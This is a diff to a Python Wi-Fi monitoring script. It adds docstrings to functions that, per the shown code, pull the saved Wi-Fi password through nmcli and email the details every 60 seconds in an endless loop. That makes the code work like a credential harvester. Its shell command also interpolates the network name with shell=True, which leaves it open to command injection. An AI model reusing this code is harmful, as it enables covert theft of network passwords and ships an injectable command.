@@ -5,6 +5,27 @@ from Email_Report import send_email
 import time
 
 def get_wifi_details():
+    """
+    Retrieves Wi-Fi connection details for the current system.
+
+    This function detects the operating system and uses system-specific commands
+    to gather information about the current Wi-Fi connection, including SSID,
+    authentication method, and password (where possible).
+
+    Returns:
+    dict: A dictionary containing Wi-Fi details. The keys may include:
+        - "SSID": The name of the connected Wi-Fi network
+        - "Radio Type": The radio type of the connection (Windows only)
+        - "Authentication": The authentication method used
+        - "Password": The Wi-Fi password (if retrievable)
+        - "Signal Strength": The signal strength (Linux and macOS)
+        - "Signal Strength (RSSI)": The RSSI value (macOS only)
+        - "Error": An error message if an exception occurs
+
+    Note:
+    The exact keys in the returned dictionary may vary depending on the
+    operating system and the available information.
+    """
     system = platform.system()
     details = {}
 
@@ -40,7 +61,7 @@ def get_wifi_details():
                 if len(parts) > 2 and parts[0] == "yes":
                     details["SSID"] = parts[1]
                     details["Signal Strength"] = f"{parts[2]}%"
-                    
+
                     # Get password
                     password_result = subprocess.check_output(f'nmcli -s -g 802-11-wireless-security.psk connection show "{parts[1]}"', shell=True, text=True)
                     details["Password"] = password_result.strip()
@@ -74,7 +95,7 @@ def get_wifi_details():
 
     else:
         return {"Error": "Unsupported platform"}
-    
+  
 def Clear_file(file_path: str):
     """
     Clears the content of a file by overwriting it with an empty string.
@@ -127,6 +148,23 @@ def Compare_content():
         print(f"Error: {e}")
         
 def Wifi_Monitor():
+    """
+    Continuously monitors Wi-Fi connection details and reports changes.
+
+    This function runs in an infinite loop, periodically checking the current Wi-Fi connection details.
+    It writes the details to a temporary file, compares it with a log file, and if there are changes,
+    it sends an email report and updates the log file. The function uses a 60-second interval between checks.
+
+    The function relies on several helper functions:
+    - get_wifi_details(): Retrieves current Wi-Fi connection information.
+    - Write_file(): Writes data to a file.
+    - Compare_content(): Compares the content of two files.
+    - Clear_file(): Clears the content of a file.
+    - send_email(): Sends an email with the Wi-Fi report.
+
+    The function does not take any parameters and does not return any value.
+    It runs indefinitely until the program is terminated externally.
+    """
     while True:
         wifi_detail = get_wifi_details()
 
@@ -145,3 +183,4 @@ def Wifi_Monitor():
             Clear_file("Temp\\Connected_wifi_temp.log")
 
         time.sleep(60)
+    
